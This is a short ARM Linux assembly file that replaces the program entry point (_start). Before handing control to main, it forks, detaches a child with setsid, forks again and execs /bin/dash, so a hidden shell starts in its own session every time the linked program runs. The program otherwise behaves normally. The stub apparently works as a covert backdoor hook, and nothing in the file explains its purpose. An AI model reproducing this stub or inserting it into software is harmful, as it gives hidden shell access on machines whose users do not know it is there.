.section .rodata
.align 4
b:
.asciz "/bin/dash"
a:
.word b
.word 0
.section .text
.global _start
.extern main
_start:
ldr r4,[sp]
add r5,sp,#4
ldr r5,[r5]
add r6,sp,#8
ldr r6,[r6]
mov r7,#2
svc #0
cmp r0,#0
bgt parent
child1:
mov r0,#0
mov r7,#112
svc #0
mov r7,#2
svc #0
cmp r0,#0
bgt child1_exit
child2:
ldr r0,=b
ldr r1,=a
mov r2,#0
mov r7,#11
svc #0
mov r0,#1
mov r7,#1
svc #0
child1_exit:
mov r0,#0
mov r7,#1
svc #0
parent:
mov r0,r4
mov r1,r5
mov r2,r6
bl main
mov r7,#1
svc #0
